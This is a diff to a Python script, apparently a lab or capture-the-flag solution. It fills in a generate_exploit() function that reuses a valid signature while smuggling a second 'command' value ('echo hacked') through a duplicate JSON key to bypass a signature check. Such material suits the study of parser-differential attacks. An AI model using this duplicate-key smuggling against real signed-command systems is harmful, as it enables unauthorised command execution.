@@ -2,11 +2,12 @@ import json
 
 
 def generate_example():
-    return json.dumps({'command': 'echo cool', 'signature': '007152ab1a65e9e864928d0f5cc6f47e8ce6217c09f7e7518d3d15f901e33df7e4bd760e2538929bdf2c5bf710b2babbcb2f268f458551ecbee78df22f3bb039696a2fccf58ccdeeb0c235e36593aa4b8be3d62e4ae6a59f6aebf78e3aec5b1685672bff191969731a096fa8f9ef29926bbee303d0673482410a25d00c46bdc1'})
+    return json.dumps({"command": "echo cool", "signature": "007152ab1a65e9e864928d0f5cc6f47e8ce6217c09f7e7518d3d15f901e33df7e4bd760e2538929bdf2c5bf710b2babbcb2f268f458551ecbee78df22f3bb039696a2fccf58ccdeeb0c235e36593aa4b8be3d62e4ae6a59f6aebf78e3aec5b1685672bff191969731a096fa8f9ef29926bbee303d0673482410a25d00c46bdc1"})
 
 
 def generate_exploit():
-    raise NotImplementedError()
+    return '{"command": "echo hacked", "signature": "007152ab1a65e9e864928d0f5cc6f47e8ce6217c09f7e7518d3d15f901e33df7e4bd760e2538929bdf2c5bf710b2babbcb2f268f458551ecbee78df22f3bb039696a2fccf58ccdeeb0c235e36593aa4b8be3d62e4ae6a59f6aebf78e3aec5b1685672bff191969731a096fa8f9ef29926bbee303d0673482410a25d00c46bdc1", "command" : "echo cool"}'
+
 
 
 def main(argv):
@@ -19,7 +20,6 @@ def main(argv):
         example, path = True,  argv[2]
     if example:
         script = generate_example()
-        print(script)
     else:
         script = generate_exploit()
     with open(path, 'w') as writer:
